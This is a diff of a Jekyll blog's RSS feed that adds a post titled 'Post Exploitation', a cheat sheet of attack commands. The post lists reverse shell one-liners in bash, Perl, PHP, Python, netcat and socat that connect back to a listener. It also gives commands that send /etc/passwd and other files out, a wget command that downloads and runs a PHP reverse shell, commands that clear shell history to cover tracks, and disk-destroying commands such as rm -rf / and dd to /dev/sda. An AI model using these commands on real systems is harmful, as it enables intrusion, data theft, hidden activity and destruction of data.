@@ -5,9 +5,153 @@
     <description>test</description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Tue, 20 Jun 2017 22:16:50 +0100</pubDate>
-    <lastBuildDate>Tue, 20 Jun 2017 22:16:50 +0100</lastBuildDate>
+    <pubDate>Thu, 03 Aug 2017 22:18:53 +0100</pubDate>
+    <lastBuildDate>Thu, 03 Aug 2017 22:18:53 +0100</lastBuildDate>
     <generator>Jekyll v3.2.0</generator>
+    
+      <item>
+        <title>Post Exploitation</title>
+        <description>&lt;p&gt;The Post Exploitation phase will determine the control of the machine compromised and will maintain the control for later use.&lt;/p&gt;
+
+&lt;h3 id=&quot;netcat-reverse-shells&quot;&gt;Netcat Reverse Shells&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;Listener:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -lvp 4444
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Target:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Windows: nc.exe 192.168.1.1 4444 -e cmd.exe
+Linux: nc 192.168.1.1 4444 -e /bin/bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;reverse-shells&quot;&gt;Reverse Shells&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;Listener:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -lvp 4444
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Target:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.1/4444 0&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;perl -e 'use Socket;$i=&quot;192.168.1.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;php -r '$sock=fsockopen(&quot;192.168.1.1&quot;,4444);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);'
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.1.1 4444 &amp;gt;/tmp/f
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0&amp;lt;&amp;amp;196; exec 196&amp;lt;&amp;gt;/dev/tcp/192.168.1.1/4444; sh &amp;lt;&amp;amp;196 &amp;gt;&amp;amp;196 2&amp;gt;&amp;amp;196
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.1:4444 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;send-files&quot;&gt;Send files&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exec 3&amp;lt;&amp;gt;/dev/tcp/192.168.1.1/4444 &amp;amp;&amp;amp; cat /etc/passwd&amp;gt;&amp;amp;3
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;send-files-through-netcat&quot;&gt;Send Files through Netcat&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;Listener:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netcat -l 4444 &amp;gt; received_file
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Target:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netcat 192.168.1.1 4444 &amp;lt; original_file
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Listener:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netcat -l 4444 | tar xzvf -
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Target:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tar -czf - * | netcat 192.168.1.1 4444
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;file-upload-in-windows-with-powershell&quot;&gt;File upload in Windows with PowerShell&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.asafety.fr/en/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/&quot;&gt;[Windows / DOS / PowerShell] File upload in command line&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;php-webshells&quot;&gt;PHP webshells&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/JohnTroony/php-webshells&quot;&gt;php-webshells&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget -O /tmp/php_shell.php https://raw.githubusercontent.com/JohnTroony/php-webshells/master/php-reverse-shell.php &amp;amp;&amp;amp; php -f /tmp/php_shell.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;covering-the-tracks&quot;&gt;Covering the tracks&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;Avoiding history&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export HISTFILE=
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unset HISTFILE
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Clear history&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm -rf .bash_history 
+touch .bash_history (invasive)
+history -c
+set +o history
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Destroy&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm -rf / 
+find / -type f -exec {} 
+mkfs.ext3 /dev/sda
+dd if=/dev/zero of=/dev/sda bs=1M
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;resources&quot;&gt;Resources&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells&quot;&gt;escaping-restricted-linux-shells&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.kernel-exploits.com/&quot;&gt;kernel-exploits&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/andrew-d/static-binaries&quot;&gt;static-binaries&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sun, 16 Jul 2017 00:00:00 +0100</pubDate>
+        <link>/Post-Exploitation.html</link>
+        <guid isPermaLink="true">/Post-Exploitation.html</guid>
+        
+        
+      </item>
     
       <item>
         <title>Python exceptions</title>
